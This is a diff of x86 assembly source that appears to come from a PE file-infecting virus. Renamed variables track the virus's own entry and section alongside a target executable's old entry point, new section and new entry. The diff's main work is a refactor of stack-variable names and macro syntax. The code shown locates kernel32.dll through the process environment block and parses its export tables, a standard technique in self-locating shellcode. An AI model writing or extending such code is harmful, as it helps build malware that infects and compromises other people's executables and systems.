@@ -19,10 +19,14 @@ old_entry:
 	; Order of each variable IN THE STACK
 	; Position relative to r|ebp calculated by -(Order * regSz)
 	
-	ImageBaseAddress EQU 1
-    OldEntry EQU 2
-    NewSection EQU 3
-	NewEntry EQU 4
+	selfImageBaseAddress EQU 1
+	selfSection EQU 2
+	selfEntry EQU 3
+	
+	tgImageBaseAddress EQU 1
+    tgOldEntry EQU 2
+    tgNewSection EQU 3
+	tgNewEntry EQU 4
 	
     kernel32dll EQU 5
     OrdinalTbl EQU 6
@@ -46,12 +50,12 @@ start:
     imul eax, regSz
     sub esp, eax
     
-    mov edx, [ebp] ; NewEntry + 1 + 4
-    sub edx, 5 ; eax = NewEntry
-    toStack(NewEntry, edx)
+    mov edx, [ebp] ; selfEntry + 1 + 4
+    sub edx, 5 ; eax = selfEntry
+    toStack selfEntry, edx
     
     sub edx, entrySectionOffset
-    toStack(NewSection, edx)
+    toStack selfSection, edx
     
     ; Find kernel32.dll
     ASSUME FS:NOTHING
@@ -61,7 +65,7 @@ start:
     mov ebx, [ebx]
     mov ebx, [ebx]
     mov ebx, [ebx + 10h]
-	toStack(kernel32dll, ebx) ; BaseAddress of kernel32.dll
+	toStack kernel32dll, ebx ; BaseAddress of kernel32.dll
     
     mov edi, [ebx + 3Ch]
     add edi, ebx
@@ -69,18 +73,18 @@ start:
     add edi, ebx
     mov ecx, [edi + 24h]
     add ecx, ebx
-    toStack(OrdinalTbl, ecx) ; VA of Ordinal Table
+    toStack OrdinalTbl, ecx ; VA of Ordinal Table
     
     mov esi, [edi + 20h]
     add esi, ebx
-    toStack(NamePtrTbl, esi) ; VA of Name Pointer Table
+    toStack NamePtrTbl, esi ; VA of Name Pointer Table
     
     mov edx, [edi + 1Ch]
     add edx, ebx
-    toStack(AddrTbl, edx) ; VA of Address Table
+    toStack AddrTbl, edx ; VA of Address Table
     
     mov edx, [edi + 14h]
-    toStack(k32NumFunc, edx)
+    toStack k32NumFunc, edx
     
     
 
